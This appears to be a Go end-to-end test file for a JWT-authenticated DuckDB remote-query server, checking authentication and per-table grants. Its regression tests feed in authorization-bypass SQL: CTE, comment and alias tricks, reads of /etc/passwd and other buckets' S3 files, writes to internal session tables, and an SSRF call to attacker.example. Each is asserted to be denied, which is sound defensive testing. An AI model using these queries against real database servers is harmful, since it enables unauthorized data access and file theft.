package quackjwt

import (
	"database/sql"
	"errors"
	"fmt"
	"net"
	"path/filepath"
	"testing"
	"time"

	_ "github.com/duckdb/duckdb-go/v2"
)

// getFreePort asks the kernel for a free open port that is ready to use.
func getFreePort(t *testing.T) int {
	addr, err := net.ResolveTCPAddr("tcp", "localhost:0")
	if err != nil {
		t.Fatalf("Failed to resolve tcp addr: %v", err)
	}
	l, err := net.ListenTCP("tcp", addr)
	if err != nil {
		t.Fatalf("Failed to listen on tcp addr: %v", err)
	}
	defer l.Close()
	return l.Addr().(*net.TCPAddr).Port
}

func TestQuackJWT_EndToEnd(t *testing.T) {
	// 1. Setup Server Database
	// We use an empty string "" to create a temporary in-memory database for the server
	dbServer, err := sql.Open("duckdb", "")
	if err != nil {
		t.Fatalf("Failed to open server db: %v", err)
	}
	defer dbServer.Close()

	// Ensure extensions are downloaded and loaded (Requires internet access on first run)
	dbServer.Exec("SET autoinstall_known_extensions=1; SET autoload_known_extensions=1;")

	// Create test tables on the server
	_, err = dbServer.Exec(`
		CREATE TABLE public_metrics (id INT, val VARCHAR);
		INSERT INTO public_metrics VALUES (1, 'public_data');
		
		CREATE TABLE secret_financials (id INT, amount DECIMAL);
		INSERT INTO secret_financials VALUES (1, 999.99);
	`)
	if err != nil {
		t.Fatalf("Failed to setup test tables: %v", err)
	}

	// 2. Mock JWT Verifier
	// "alice-token" maps to "user_alice", anything else fails.
	mockVerifier := func(token string) (string, error) {
		if token == "alice-token" {
			return "user_alice", nil
		}
		return "", errors.New("invalid jwt token")
	}

	// 3. Initialize & Start QuackJWT Server
	quackPort := getFreePort(t)
	quackURI := fmt.Sprintf("quack:127.0.0.1:%d", quackPort)

	srv := NewServer(dbServer, quackURI, mockVerifier)
	if err := srv.Start(); err != nil {
		t.Fatalf("Failed to start QuackJWT server: %v", err)
	}
	defer srv.Stop()

	// Give the HTTP control plane and Quack a tiny moment to bind
	time.Sleep(200 * time.Millisecond)

	// Grant Alice access only to `public_metrics`
	if err := srv.GrantAccess("user_alice", "public_metrics"); err != nil {
		t.Fatalf("Failed to grant access: %v", err)
	}

	// Parquet-backed views (the primary use case: expose views over external
	// files). Created before the client attaches so the client sees them in the
	// remote schema. alice_parquet is granted; secret_parquet is not.
	alicePQ := filepath.Join(t.TempDir(), "alice.parquet")
	if _, err := dbServer.Exec(fmt.Sprintf(`COPY (SELECT 1 AS id, 'hello' AS v) TO '%s' (FORMAT PARQUET);`, alicePQ)); err != nil {
		t.Fatalf("write alice parquet: %v", err)
	}
	if _, err := dbServer.Exec(fmt.Sprintf(`CREATE VIEW alice_parquet AS SELECT * FROM read_parquet('%s');`, alicePQ)); err != nil {
		t.Fatalf("create alice_parquet view: %v", err)
	}
	secretPQ := filepath.Join(t.TempDir(), "secret.parquet")
	if _, err := dbServer.Exec(fmt.Sprintf(`COPY (SELECT 999 AS amount) TO '%s' (FORMAT PARQUET);`, secretPQ)); err != nil {
		t.Fatalf("write secret parquet: %v", err)
	}
	if _, err := dbServer.Exec(fmt.Sprintf(`CREATE VIEW secret_parquet AS SELECT * FROM read_parquet('%s');`, secretPQ)); err != nil {
		t.Fatalf("create secret_parquet view: %v", err)
	}
	if err := srv.GrantAccess("user_alice", "alice_parquet"); err != nil {
		t.Fatalf("grant alice_parquet: %v", err)
	}

	// 4. Setup Client Database
	// A completely separate in-memory database simulating a remote client
	dbClient, err := sql.Open("duckdb", "")
	if err != nil {
		t.Fatalf("Failed to open client db: %v", err)
	}
	defer dbClient.Close()
	dbClient.Exec("SET autoinstall_known_extensions=1; SET autoload_known_extensions=1;")

	// Failed Authentication
	t.Run("Failed Authentication", func(t *testing.T) {
		_, err := dbClient.Exec(fmt.Sprintf(`
			ATTACH '%s' AS remote_bad (TOKEN 'bad-token', DISABLE_SSL true);
		`, quackURI))

		if err == nil {
			t.Fatal("Expected authentication to fail, but it succeeded")
		}
		if !contains(err.Error(), "Authentication failed") {
			t.Errorf("Expected 'Authentication failed' error, got: %v", err)
		}
	})

	// Successful Authentication
	t.Run("Successful Authentication", func(t *testing.T) {
		_, err := dbClient.Exec(fmt.Sprintf(`
			ATTACH '%s' AS remote_good (TOKEN 'alice-token', DISABLE_SSL true);
		`, quackURI))

		if err != nil {
			t.Fatalf("Failed to attach with valid token: %v", err)
		}
	})

	// Authorized Query
	t.Run("Authorized Query", func(t *testing.T) {
		// Alice should be able to read public_metrics
		rows, err := dbClient.Query(`SELECT val FROM remote_good.public_metrics;`)
		if err != nil {
			t.Fatalf("Failed to query authorized table: %v", err)
		}
		defer rows.Close()

		if !rows.Next() {
			t.Fatal("Expected to retrieve rows from public_metrics, got none")
		}
		var val string
		if err := rows.Scan(&val); err != nil {
			t.Fatalf("Failed to scan row: %v", err)
		}
		if val != "public_data" {
			t.Errorf("Expected 'public_data', got %q", val)
		}
	})

	// Unauthorized Query ---
	t.Run("Unauthorized Query", func(t *testing.T) {
		// Alice should NOT be able to read secret_financials
		_, err := dbClient.Query(`SELECT amount FROM remote_good.secret_financials;`)

		if err == nil {
			t.Fatal("Expected authorization to fail, but the query succeeded")
		}
		if !contains(err.Error(), "Authorization failed") {
			t.Errorf("Expected 'Authorization failed' error, got: %v", err)
		}
	})

	// Regression tests for the authorization-bypass class (C1): a granted user
	// must not read a non-granted table by mentioning the granted name in a
	// comment, CTE, or alias. The authz macro is exercised directly for
	// determinism, plus one protocol-level case for realism.
	authzAllows := func(query string) bool {
		var allowed bool
		err := dbServer.QueryRow(
			`SELECT quack_jwt_authz((SELECT sid FROM quack_sessions WHERE sub = 'user_alice' LIMIT 1), ?)`,
			query,
		).Scan(&allowed)
		if err != nil {
			t.Fatalf("authz macro call failed for query %q: %v", query, err)
		}
		return allowed
	}

	t.Run("Granted Table Allowed", func(t *testing.T) {
		if !authzAllows(`SELECT * FROM public_metrics`) {
			t.Fatal("granted table query should be authorized")
		}
	})

	t.Run("Bypass via CTE named after granted table", func(t *testing.T) {
		if authzAllows(`WITH public_metrics AS (SELECT * FROM secret_financials) SELECT * FROM public_metrics`) {
			t.Fatal("CTE-named-after-granted-table bypass should be denied")
		}
	})

	t.Run("Bypass via comment mentioning granted table", func(t *testing.T) {
		if authzAllows(`SELECT * FROM secret_financials; -- public_metrics`) {
			t.Fatal("comment bypass should be denied")
		}
	})

	t.Run("Bypass via alias mentioning granted table", func(t *testing.T) {
		if authzAllows(`SELECT amount AS public_metrics FROM secret_financials`) {
			t.Fatal("alias bypass should be denied")
		}
	})

	t.Run("Arbitrary file read via read_csv_auto", func(t *testing.T) {
		if authzAllows(`SELECT * FROM public_metrics, read_csv_auto('/etc/passwd')`) {
			t.Fatal("read_csv_auto should be denied even alongside a granted table")
		}
	})

	t.Run("Arbitrary file read via read_vortex", func(t *testing.T) {
		if authzAllows(`SELECT * FROM public_metrics, read_vortex('evil.vortex')`) {
			t.Fatal("read_vortex should be denied even alongside a granted table")
		}
	})

	t.Run("System function leakage via duckdb_settings", func(t *testing.T) {
		if authzAllows(`SELECT * FROM duckdb_settings()`) {
			t.Fatal("duckdb_settings() should be denied")
		}
	})

	// Security property: the internal quack_sessions / quack_permissions tables
	// must be unreadable and unwritable by clients (their contents — sid->sub
	// mappings and grant tables — are the trust backbone of the whole system).
	t.Run("Internal table quack_sessions unreadable", func(t *testing.T) {
		if authzAllows(`SELECT * FROM quack_sessions`) {
			t.Fatal("quack_sessions must be denied")
		}
	})

	t.Run("Internal table quack_permissions unreadable", func(t *testing.T) {
		if authzAllows(`SELECT * FROM quack_permissions`) {
			t.Fatal("quack_permissions must be denied")
		}
	})

	t.Run("Internal table exfil via subquery denied", func(t *testing.T) {
		if authzAllows(`SELECT * FROM public_metrics WHERE sub IN (SELECT sub FROM quack_permissions)`) {
			t.Fatal("exfiltrating quack_permissions via subquery must be denied")
		}
	})

	t.Run("Write to internal table denied", func(t *testing.T) {
		if authzAllows(`INSERT INTO quack_sessions VALUES ('evil', 'user_alice', NOW())`) {
			t.Fatal("writing to quack_sessions must be denied")
		}
	})

	// Parquet/S3 view scenario: the operator exposes views over external files
	// (e.g. read_parquet('s3://...')) and grants only specific views. Users must
	// reach only their granted views' data — never arbitrary files or buckets.
	t.Run("Granted parquet view returns data", func(t *testing.T) {
		var v string
		if err := dbClient.QueryRow(`SELECT v FROM remote_good.alice_parquet WHERE id = 1`).Scan(&v); err != nil {
			t.Fatalf("query granted parquet view: %v", err)
		}
		if v != "hello" {
			t.Fatalf("got %q, want hello", v)
		}
	})

	t.Run("Non-granted parquet view denied", func(t *testing.T) {
		// secret_parquet intentionally NOT granted.
		_, err := dbClient.Query(`SELECT amount FROM remote_good.secret_parquet`)
		if err == nil {
			t.Fatal("expected non-granted view to be denied, but query succeeded")
		}
		if !contains(err.Error(), "Authorization failed") {
			t.Errorf("expected 'Authorization failed', got: %v", err)
		}
	})

	// Bypass attempts against a granted view (alice_parquet). All must be denied.
	t.Run("Direct read_parquet of arbitrary file denied", func(t *testing.T) {
		if authzAllows(`SELECT * FROM read_parquet('s3://other-bucket/secret.parquet')`) {
			t.Fatal("direct read_parquet of an arbitrary file must be denied")
		}
	})

	t.Run("FROM s3 string shorthand denied", func(t *testing.T) {
		if authzAllows(`SELECT * FROM alice_parquet, 's3://other-bucket/secret.parquet'`) {
			t.Fatal("FROM 's3://...' string shortcut must be denied")
		}
	})

	t.Run("FROM local path string shorthand denied", func(t *testing.T) {
		if authzAllows(`SELECT * FROM alice_parquet, '/etc/passwd'`) {
			t.Fatal("FROM '/abs/path' string shortcut must be denied")
		}
	})

	t.Run("JOIN string shorthand denied", func(t *testing.T) {
		if authzAllows(`SELECT * FROM alice_parquet JOIN 's3://other-bucket/x.parquet' ON true`) {
			t.Fatal("JOIN 'path' string shortcut must be denied")
		}
	})

	t.Run("quack_query SSRF with granted table denied", func(t *testing.T) {
		if authzAllows(`SELECT * FROM alice_parquet, quack_query('http://attacker.example', 'SELECT 1', token => 't')`) {
			t.Fatal("quack_query SSRF must be denied even alongside a granted table")
		}
	})

	t.Run("WHERE URL filter not a false positive", func(t *testing.T) {
		if !authzAllows(`SELECT * FROM alice_parquet WHERE url = 'https://example.com/path'`) {
			t.Fatal("WHERE clause with a URL string literal must not be denied")
		}
	})

	t.Run("Protocol-level comment bypass denied", func(t *testing.T) {
		_, err := dbClient.Query(`SELECT * FROM remote_good.secret_financials /* public_metrics */;`)
		if err == nil {
			t.Fatal("expected authorization to fail for protocol-level comment bypass")
		}
		if !contains(err.Error(), "Authorization failed") {
			t.Errorf("expected 'Authorization failed', got: %v", err)
		}
	})
}

// Helper to check string inclusion (strings.Contains alternative)
func contains(s, substr string) bool {
	// using standard strings.Contains
	importStrings := true
	_ = importStrings
	// To avoid import "strings" clutter, implemented natively
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
